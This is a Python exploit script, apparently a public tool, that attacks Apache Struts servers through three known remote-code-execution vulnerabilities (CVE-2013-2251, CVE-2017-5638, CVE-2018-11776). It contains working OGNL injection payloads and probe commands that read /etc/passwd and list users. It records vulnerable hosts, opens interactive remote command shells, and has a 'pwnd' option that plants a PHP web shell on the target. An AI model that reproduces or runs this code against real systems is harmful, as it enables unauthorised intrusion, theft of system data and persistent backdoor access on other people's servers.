#!/usr/bin/env python3
"""
Apache Struts

Copyright (c) 2020 Nicolas Beguier
Licensed under the Apache License
Written by Nicolas BEGUIER (nicolas_beguier@hotmail.com)
"""

# Standard library imports
from argparse import ArgumentParser
import urllib
import time
import os
import sys

# Third party library imports
import requests

# Debug
# from pdb import set_trace as st

RED = '\033[1;31m'
BLUE = '\033[94m'
BOLD = '\033[1m'
GREEN = '\033[32m'
OTRO = '\033[36m'
YELLOW = '\033[33m'
ENDC = '\033[0m'

VERSION = '1.0.0'

LOGO = BLUE+'''                                                             
  ___   _____  ___    _   _  _____  ___   
 (  _`\(_   _)|  _`\ ( ) ( )(_   _)(  _`\ 
 | (_(_) | |  | (_) )| | | |  | |  | (_(_)
 `\__ \  | |  | ,  / | | | |  | |  `\__ \ 
 ( )_) | | |  | |\ \ | (_) |  | |  ( )_) |
 `\____) (_)  (_) (_)(_____)  (_)  `\____) 

        =[ Command Execution v3]=
              By @s1kr10s - @nbeguier
'''+ENDC

def cls():
    os.system(['clear', 'cls'][os.name == 'nt'])

def main(params):
    """
    Main function
    """
    host = params['url']
    if len(host) > 0:
        if host.find("https://") != -1 or host.find("http://") != -1:

            poc = "?redirect:${%23w%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29.getWriter%28%29,%23w.println%28%27mamalo%27%29,%23w.flush%28%29,%23w.close%28%29}"

            def exploit1(command):
                exploit1 = "?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{"+command+"}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}"
                return exploit1

            def exploit2(command):
                exploit2 = "Content-Type:%{(+++#_='multipart/form-data').(+++#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(+++#_memberAccess?(+++#_memberAccess=#dm):((+++#container=#context['com.opensymphony.xwork2.ActionContext.container']).(+++#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(+++#ognlUtil.getExcludedPackageNames().clear()).(+++#ognlUtil.getExcludedClasses().clear()).(+++#context.setMemberAccess(+++#dm)))).(+++#shell='"+str(command)+"').(+++#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(+++#shells=(+++#iswin?{'cmd.exe','/c',#shell}:{'/bin/sh','-c',#shell})).(+++#p=new java.lang.ProcessBuilder(+++#shells)).(+++#p.redirectErrorStream(true)).(+++#process=#p.start()).(+++#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(+++#process.getInputStream(),#ros)).(+++#ros.flush())}"
                return exploit2

            def exploit3(command):
                exploit3 = "%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27"+command+"%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D"
                return exploit3

            def pwnd(shellfile):
                exploitfile = "?redirect:${%23a%3d%28new%20java.lang.ProcessBuilder%28new%20java.lang.String[]{"+shellfile+"}%29%29.start%28%29,%23b%3d%23a.getInputStream%28%29,%23c%3dnew%20java.io.InputStreamReader%28%23b%29,%23d%3dnew%20java.io.BufferedReader%28%23c%29,%23e%3dnew%20char[50000],%23d.read%28%23e%29,%23matt%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23matt.getWriter%28%29.println%28%23e%29,%23matt.getWriter%28%29.flush%28%29,%23matt.getWriter%28%29.close%28%29}"
                return exploitfile

            def validador():
                arr_lin_win = ["file%20/etc/passwd", "dir", "net%20users", "id", "/sbin/ifconfig", "cat%20/etc/passwd"]
                return arr_lin_win

            # CVE-2013-2251 ---------------------------------------------------------------------------------

            try:
                response = requests.get(host+poc).text
            except:
                print(RED+" Server does not respond\n"+ENDC)
                sys.exit(1)

            print(BOLD+"\n [+] EXECUTING EXPLOIT CVE-2013-2251"+ENDC)

            if response.find(".getWriter") == -1:
                if response.find("mamalo") != -1:
                    print(RED+"   [-] VULNERABLE"+ENDC)
                    owned = open('vulnsite.txt', 'a')
                    owned.write(str(host)+'\n')
                    owned.close()

                    option = input(YELLOW+"   [-] RUN THIS EXPLOIT (y/n): "+ENDC)
                    if option == 'y':
                        print(YELLOW+"   [-] GET PROMPT...\n"+ENDC)
                        time.sleep(1)
                        print(BOLD+"   * [UPLOAD SHELL]"+ENDC)
                        print(OTRO+"     Struts@Shell:$ pwnd (php)\n"+ENDC)

                        while 1:
                            separator = input(GREEN+"Struts2@Shell_1:$ "+ENDC)
                            space = separator.split(' ')
                            command = "','".join(space)

                            if space[0] != 'reverse' and space[0] != 'pwnd':
                                shell = requests.get(host+exploit1("'"+str(command)+"'"))
                                print("\n"+shell.text)
                            elif space[0] == 'pwnd':
                                pathsave = input("path EJ:/tmp/: ")

                                if space[1] == 'php':
                                    shellfile = """'python','-c','f%3dopen("/tmp/status.php","w");f.write("<?php%20system($_GET[ksujenenuhw])?>")'"""
                                    requests.get(host+pwnd(str(shellfile)))
                                    shell = requests.get(host+exploit1("'ls','-l','"+pathsave+"status.php'"))
                                    if shell.text.find(pathsave+"status.php") != -1:
                                        print(BOLD+GREEN+"\nCreate File Successfull :) ["+pathsave+"status.php]\n"+ENDC)
                                    else:
                                        print(BOLD+RED+"\nNo Create File :/\n"+ENDC)

            # CVE-2017-5638 ---------------------------------------------------------------------------------
            print(BLUE+"     [-] NOT VULNERABLE"+ENDC)
            print(BOLD+" [+] EXECUTING EXPLOIT CVE-2017-5638"+ENDC)
            count = 0
            while count < len(validador()):
                valida = validador()[count]

                try:
                    req = requests.get(host, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit2(str(valida))})
                    result = req.text

                    if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find(" netmask ") != -1 or result.find("root:") != -1 or result.find("groups=") != -1 or result.find("User accounts for") != -1 or result.find("de usuario de") != -1:
                        print(RED+"   [-] VULNERABLE"+ENDC)
                        owned = open('vulnsite.txt', 'a')
                        owned.write(str(host)+'\n')
                        owned.close()

                        option = input(YELLOW+"   [-] RUN THIS EXPLOIT (y/n): "+ENDC)
                        if option == 'y':
                            print(YELLOW+"   [-] GET PROMPT...\n"+ENDC)
                            time.sleep(1)

                            while 1:
                                try:
                                    separator = input(GREEN+"\nStruts2@Shell_2:$ "+ENDC)
                                    req = requests.get(host, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': exploit2(str(separator))})
                                    result = req.text
                                    print("\n"+result)
                                except:
                                    sys.exit(0)
                        else:
                            count = len(validador())
                    else:
                        print(BLUE+"     [-] NOT VULNERABLE "+ENDC + "Payload: " + str(count))
                except:
                    pass
                count += 1

            # CVE-2018-11776 ---------------------------------------------------------------------------------
            print(BLUE+"     [-] NOT VULNERABLE"+ENDC)
            print(BOLD+" [+] EXECUTING EXPLOIT CVE-2018-11776"+ENDC)
            count = 0
            while count < len(validador()):
                #Filtramos la url solo dominio
                url = host.replace('#', '%23')
                url = host.replace(' ', '%20')
                if '://' not in url:
                    url = str("http://") + str(url)
                scheme = urllib.parse.urlparse(url).scheme
                site = scheme + '://' + urllib.parse.urlparse(url).netloc

                #Filtramos la url solo path
                file_path = urllib.parse.urlparse(url).path
                if file_path == '':
                    file_path = '/'

                valida = validador()[count]

                try:
                    result = requests.get(site+"/"+exploit3(str(valida))+file_path).text

                    if result.find("ASCII") != -1 or result.find("No such") != -1 or result.find("Directory of") != -1 or result.find("Volume Serial") != -1 or result.find(" netmask ") != -1 or result.find("root:") != -1 or result.find("groups=") != -1 or result.find("User accounts for") != -1 or result.find("de usuario de") != -1:
                        print(RED+"   [-] VULNERABLE"+ENDC)
                        owned = open('vulnsite.txt', 'a')
                        owned.write(str(host)+'\n')
                        owned.close()

                        option = input(YELLOW+"   [-] RUN THIS EXPLOIT (y/n): "+ENDC)
                        if option == 'y':
                            print(YELLOW+"   [-] GET PROMPT...\n"+ENDC)
                            time.sleep(1)

                            while 1:
                                separator = input(GREEN+"Struts2@Shell_3:$ "+ENDC)
                                space = separator.split(' ')
                                command = "%20".join(space)

                                shell = requests.get(site+"/"+exploit3(str(command))+file_path)
                                print("\n"+shell.text)
                        else:
                            count = len(validador())
                            sys.exit(0)
                    else:
                        print(BLUE+"     [-] NOT VULNERABLE "+ENDC + "Payload: " + str(count))
                except:
                    pass
                count += 1
        else:
            print(RED+" You must enter the protocol (https or http) for the domain\n"+ENDC)
            sys.exit(0)
    else:
        print(RED+" You must enter a URL\n"+ENDC)
        sys.exit(0)

if __name__ == '__main__':
    PARSER = ArgumentParser()

    PARSER.add_argument('--version', action='version', version=VERSION)
    PARSER.add_argument('-u', '--url', action='store',\
        help="URL to exploit")
    PARSER.add_argument('--cls', action='store_true',\
        help="clean shell before starting", default=False)
    PARSER.add_argument('--no-header', action='store_true',\
        help="hide logo header", default=False)
    ARGS = PARSER.parse_args()

    PARAMS = dict()
    PARAMS['url'] = ARGS.url
    if not ARGS.no_header:
        print(LOGO)
    if ARGS.cls:
        cls()
    if not ARGS.url:
        print(" * Example: http(s)://www.victima.com/files.login\n")
        PARAMS['url'] = input(BOLD+" [+] HOST: "+ENDC)

    main(PARAMS)
